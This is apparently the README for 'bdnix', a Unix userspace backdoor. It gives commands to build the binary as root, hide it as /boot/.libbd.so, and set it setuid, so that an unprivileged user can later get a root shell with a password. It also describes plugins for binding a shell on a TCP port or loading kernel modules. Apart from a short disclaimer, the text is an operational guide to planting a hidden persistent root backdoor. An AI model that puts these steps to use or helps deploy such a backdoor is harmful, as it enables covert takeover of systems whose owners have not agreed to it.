<pre>
  ___ ___  _  _ _____  __
 | _ )   \| \| |_ _\ \/ /
 | _ \ |) | .` || | >  < 
 |___/___/|_|\_|___/_/\_\                          

Trivial userspace backdoor for Unix
Emanuele Paiano - nixw0rm@gmail.com

</pre>

<p>This is a learning tool, so use it ONLY on your home systems (like 
Desktop PC or Raspberry Pi). I'm not responsable for abuses. 
Use it at your risk!</p>                      


<h2 class="section-heading">GETTING STARTED</h2>

<ul>
<li>
 <p>Open root terminal in current directory and go into bdnix folder</p>
  <pre>
	# cd /path/bdnix
  </pre>
</li>
<li>
<p>From root run 'make' to build binary file</p>
<pre>
	# make
</pre>
<p>
copy created file (i.e. libbd.so) with -p option to a hidden location like /bin, /etc,</p>
<pre>
        # cp -p libbd.so /boot/.libbd.so
        # chmod +sx /boot/.libbd.so
</pre>       
<p>   and setuid file (chmod +x).</p>


</li>
<li><p>
	logout from server and log in again with unprivileged user. 
    </p>
</li>
<li>
<p> Run binary with </p>
<pre>
	$ /boot/.libbd.so joshua /bin/sh
</pre>
<p> if you see '#' then.. you are root! :)</p>




<h2 class="section-heading">CUSTOMIZE PASSWORD</h2>


Opening settings.h you can change default password "joshua" (can you remember WOPR?):

        #define ARG1 "joshua"

we can change it to "chips"

        #define ARG1 "chips"

Now recompiling (read above) and running with new password:

        $ /boot/.libbd.so chips /bin/sh
        #

If we have rootshell, it works! :)


<h2 class="section-heading">ENABLING PLUGINS</h2>

Plugins are .h file in plugins/ folders. By plugins you can add code portions and
add new functionaties to bdnix (i.e. binding shell on TCP port, loading kernel module, etc).
To enable a plugin:

1) Open settings.h include file and search for options like:

        /* PLUGINS */

        /* enable rootshell */
        #define SHELL 1
        
2) Change 1 to enable, or 0 to disable code.

Example. If you have rootshell disabled and myplugin enabled:

        /* enable rootshell */
        #define SHELL 0
        
        /* my plugin */
        #define MYPLUGIN 1
        
Your backdoor run MYPLUGIN code and ignore rootshell. You can enable more plugins together: 
all enabled plugins run in sequential mode. 

For adding or writing custom plugin, read WRITING A PLUGIN.


-------------------
 WRITING A PLUGIN
-------------------
1) If you need write plugin, you must create .h file into plugin using next template:

        int <PLUGIN_NAME>_init()
        {
          //code plugin
        }

   replacing <PLUGIN_NAME> with your plugin's name and write you code inside function. 

2) Open bdcode.c and find this code into main():

    #if SHELL == 1
      shell_init(argv[2]);
    #endif
    
   and edit previos code in this:
   
    #if SHELL == 1
      shell_init(argv[2]);
    #endif
    #if <PLUGIN_NAME> == 1
      <PLUGIN_NAME>_init();
    #endif

   removing <PLUGIN_NAME> with you plugin's name.

   TIPS EXAMPLE: You can start to write you plugin editing RAW plugin.



----------
 LICENSE
----------
Trivial userspace backdoor
Copyright (C) 2012  Emanuele Paiano
nixw0rm@gmail.com

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
